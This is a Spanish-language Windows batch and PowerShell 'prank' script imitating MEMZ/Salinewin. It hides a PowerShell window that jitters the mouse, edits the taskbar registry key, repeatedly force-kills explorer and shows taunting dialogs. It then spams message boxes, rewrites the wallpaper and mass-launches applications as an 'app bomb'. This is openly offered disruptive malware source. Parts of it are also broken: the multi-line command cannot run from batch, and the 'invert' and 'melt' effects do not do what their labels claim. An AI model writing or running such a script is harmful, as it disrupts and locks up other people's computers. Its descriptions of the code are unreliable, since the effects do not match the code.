@echo off
title === MEMZ + SALINEWIN ULTRA CHAOS - VISUAL DESTRUCTION ===
color 0C
echo.
echo =====================================================
echo     MEMZ + SALINEWIN STYLE - CAOS VISUAL MÁXIMO
echo   Tunnel + Melt + Invert + Mouse Jitter + Flashes
echo =====================================================
echo.
echo ¡El escritorio va a volverse completamente loco!
echo Para detener: Ctrl + Shift + Esc → mata powershell y cmd
pause

set "img_folder=%USERPROFILE%\Desktop\prank_images"
if not exist "%img_folder%" mkdir "%img_folder%"

:: ==================== POWERShell CAOS VISUAL MÁXIMO ====================
powershell -NoProfile -WindowStyle Hidden -Command "
Add-Type -AssemblyName System.Windows.Forms;
Add-Type -AssemblyName System.Drawing;
$ErrorActionPreference = 'SilentlyContinue';

function Invert-Colors { 
    try { [System.Windows.Forms.SendKeys]::SendWait('^{ESC}'); Start-Sleep -Milliseconds 60 } catch {}
}

function Mouse-Chaos {
    for($i=1; $i -le 20; $i++) {
        $x = [System.Windows.Forms.Cursor]::Position.X + (Get-Random -Minimum -60 -Maximum 60)
        $y = [System.Windows.Forms.Cursor]::Position.Y + (Get-Random -Minimum -60 -Maximum 60)
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
        Start-Sleep -Milliseconds 15
    }
}

function Screen-Tunnel-Melt {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen(0,0,0,0,$bmp.Size)
        $g.Dispose()
        for($i=1; $i -le 18; $i++) {
            $scale = 1 - ($i * 0.055)
            if($scale -lt 0.12) { $scale = 0.12 }
            $nw = [int]($bmp.Width * $scale)
            $nh = [int]($bmp.Height * $scale)
            $dest = New-Object System.Drawing.Bitmap $nw, $nh
            $dg = [System.Drawing.Graphics]::FromImage($dest)
            $dg.DrawImage($bmp, 0, 0, $nw, $nh)
            $dg.Dispose()
            Start-Sleep -Milliseconds 25
        }
    } catch {}
}

function Stretch-Screen {
    try {
        [System.Windows.Forms.SendKeys]::SendWait('%{TAB}')
        Start-Sleep -Milliseconds 100
    } catch {}
}

function Play-Error-Fast { 
    [System.Media.SystemSounds]::Hand.Play()
    Start-Sleep -Milliseconds 30
}

function Hide-Taskbar {
    try {
        $p='HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3'
        $v=(Get-ItemProperty -Path $p).Settings
        $v[8]=3
        Set-ItemProperty -Path $p -Name Settings -Value $v
        Stop-Process -f -ProcessName explorer
        Start-Sleep -Milliseconds 800
        $v[8]=2
        Set-ItemProperty -Path $p -Name Settings -Value $v
        Stop-Process -f -ProcessName explorer
    } catch {}
}

$counter = 0
while($counter -lt 250) {
    $counter++
    
    if($counter % 2 -eq 0) { Invert-Colors }
    Mouse-Chaos
    if($counter % 3 -eq 0) { Screen-Tunnel-Melt }
    if($counter % 7 -eq 0) { Stretch-Screen }
    if($counter % 2 -eq 0) { Play-Error-Fast }
    
    # Mensajes estilo MEMZ/Salinewin
    if($counter % 4 -eq 0) {
        $msgs = @(
            '¡Todavía estás usando este ordenador? LOL',
            'MEMZ + Salinewin te están derritiendo la pantalla',
            '¡Error: Tu cordura se ha evaporado!',
            'Gatos gigantes y túneles controlan todo',
            '¿Por qué sigues moviendo el mouse? Es inútil',
            'Tu PC ahora es un meme viviente',
            '¡El escritorio se está derritiendo en tiempo real!',
            'No hay escapatoria... ¡Disfruta el caos!'
        )
        $msg = $msgs | Get-Random
        [System.Windows.Forms.MessageBox]::Show($msg, 'ULTRA CHAOS', 'OK', 'Critical') | Out-Null
    }
    
    if($counter % 8 -eq 0) { Hide-Taskbar }
    
    # Abrir apps como ametralladora
    if($counter % 5 -eq 0) {
        Start-Process mspaint -WindowStyle Minimized
        Start-Process calc
        Start-Process notepad
        Start-Process cmd -WindowStyle Minimized
        Start-Process explorer
    }
    
    Start-Sleep -Milliseconds 120   # ¡Aún más rápido!
}

[System.Windows.Forms.MessageBox]::Show('Tu PC ha sido completamente destruido visualmente por MEMZ + Salinewin style... ¡Buena suerte!', 'CHAOS COMPLETE', 'OK', 'Information')
" >nul 2>&1

:: ==================== SPAM EXTRA + FONDOS + BOMBA DE APPS ====================
echo Iniciando spam visual extremo...

for /l %%i in (1,1,30) do (
    for /l %%j in (1,1,80) do (
        set /a "r=!random! %% 8"
        if !r! == 0 powershell -Command "[System.Windows.Forms.MessageBox]::Show('¡EL TUNEL TE ESTÁ DEVORANDO!', 'CHAOS', 'OK', 'Critical')" 2>nul
        if !r! == 1 powershell -Command "[System.Windows.Forms.MessageBox]::Show('¡NO HAY ESCAPE DEL MELT!', 'SALINEWIN', 'OK', 'Stop')" 2>nul
        timeout /t 1 /nobreak >nul
    )
)

if exist "%img_folder%" (
    echo Cambiando fondos a velocidad INSANA...
    for /l %%c in (1,1,150) do (
        for %%f in ("%img_folder%\*.*") do (
            reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%%f" /f >nul
            rundll32.exe user32.dll,UpdatePerUserSystemParameters >nul 2>&1
            timeout /t 1 /nobreak >nul
        )
    )
)

echo Bomba final de aplicaciones...
for /l %%i in (1,1,50) do (
    start mspaint
    start calc
    start notepad
    start cmd
    timeout /t 1 /nobreak >nul
)

echo.
echo =====================================================
echo ¡CAOS VISUAL MÁXIMO MEMZ + SALINEWIN ACTIVADO!
echo Tunnel profundo, melt, invert, mouse loco, flashes y más.
echo ¡Buena suerte cerrando todo esto!
echo =====================================================
pause
exit